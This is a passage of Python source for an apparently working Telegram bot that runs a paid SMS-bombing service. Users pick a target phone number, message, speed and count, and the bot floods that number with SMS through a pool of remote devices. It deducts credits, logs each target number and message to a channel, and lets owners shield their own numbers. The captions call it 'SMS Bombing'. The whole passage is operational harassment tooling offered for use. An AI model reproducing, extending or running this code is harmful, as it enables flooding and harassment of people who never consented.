    await state.set_state(S.send_number)
    await safe_edit(cq.message, 
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await safe_edit(cq.message, 
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await safe_edit(cq.message, 
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await safe_edit(cq.message, 
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await safe_edit(cq.message, 
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await safe_edit(cq.message, 
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        session.blast_data = load()  # Load once at start of blast
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                # Use session-stored data instead of reloading from disk
                                deduct_credits(uid, 1, session.blast_data)
                                session.blast_data["stats"]["total_sent"] = session.blast_data["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in session.blast_data["users"]:
                                    session.blast_data["users"][k]["uses"] = session.blast_data["users"][k].get("uses", 0) + 1
                                session.blast_data.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent"
                                })
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):

                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {u_name}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"📞 <b>Target Number:</b> <code>{number}</code>\n"
        f"💬 <b>Message:</b> <code>{message}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await safe_edit(cq.message, 
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    photo_count = sum(1 for v in videos if isinstance(v, dict) and v.get("type") == "photo")
    video_count = len(videos) - photo_count
    await safe_edit(cq.message, 
        f"{em(EMOJI_VIDEO, '📹')} <b>Media Manager</b>\n\n"
        f"Total Saved: <b>{len(videos)}</b>\n"
        f"🖼 Photos: <b>{photo_count}</b> | 📹 Videos: <b>{video_count}</b>\n\n"
        f"<i>Ek hi library se photo aur video dono add kar sakte hain, spoiler ke saath bhi.</i>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await safe_edit(cq.message, 
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Media</b>\n\n"
        f"Photo ya Video bhejiyega (ya File ID/URL text mein bhi bhej sakte hain):",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    media_type = None
    file_id = None

    if msg.photo:
        media_type = "photo"
        file_id = msg.photo[-1].file_id
    elif msg.video:
        media_type = "video"
        file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type:
        if msg.document.mime_type.startswith("video"):
            media_type = "video"
            file_id = msg.document.file_id
        elif msg.document.mime_type.startswith("image"):
            media_type = "photo"
            file_id = msg.document.file_id
    elif msg.text:
        # can't auto-detect type from raw file_id/URL text — default to video, owner can remove+redo if wrong
        media_type = "video"
        file_id = msg.text.strip()

    if not file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Photo ya Video bhejiyega.", parse_mode="HTML")
        return

    await state.update_data(pending_media_type=media_type, pending_file_id=file_id)
    await state.set_state(S.add_media_spoiler_confirm)

    icon = "🖼" if media_type == "photo" else "📹"
    await msg.answer(
        f"{icon} <b>{'Photo' if media_type == 'photo' else 'Video'} received!</b>\n\n"
        f"Isko <b>spoiler</b> (blur) ke saath bhejna hai?",
        reply_markup=kb(
            [("🙈 Haan, Spoiler", "owner:videos:spoiler:yes"), ("👁 Nahi, Normal", "owner:videos:spoiler:no")],
            [(f"{sc('cancel')}", "owner:videos:menu")]
        ),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:videos:spoiler:yes", "owner:videos:spoiler:no"}))
async def owner_videos_spoiler_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return

    fsmd = await state.get_data()
    media_type = fsmd.get("pending_media_type")
    file_id    = fsmd.get("pending_file_id")

    if not file_id:
        await cq.answer("❌ Session expired, dobara try karein!", show_alert=True)
        await state.clear()
        return

    spoiler = cq.data.endswith(":yes")

    def _add(d):
        d.setdefault("videos", []).append({
            "type": media_type,
            "file_id": file_id,
            "spoiler": spoiler
        })

    atomic_update(_add)
    await state.clear()

    icon = "🖼" if media_type == "photo" else "📹"
    spoiler_txt = "🙈 Spoiler ON" if spoiler else "👁 Normal (No Spoiler)"
    await safe_edit(cq.message, 
        f"{em(EMOJI_CHECK, '✅')} <b>{icon} Media Saved Successfully!</b>\n\n{spoiler_txt}",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Media Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All Media Deleted Bulk Mode!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("❌ Abhi koi media available nahi hai!", show_alert=True)
        return
    await cq.answer("📤 Sending...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await safe_edit(cq.message, 
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Jis number ko protect karna hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Protected number sirf Owner/Super Admin hi use kar sakte hain.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)

    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"
        f"{em(EMOJI_CROWN, '👤')} Protected by: <code>{uid}</code>\n\n"
        f"Ab sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "number_protected", uid, f"Protected {number}")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})

    if not protected:
        await safe_edit(cq.message, 
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)

    for number, protector_uid in protected.items():
        if is_owner_user:
            display_number = number
        else:
            display_number = mask_number(number)

        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")

        lines.append(
            f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code>\n"
            f"   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n"
        )

    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, "\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

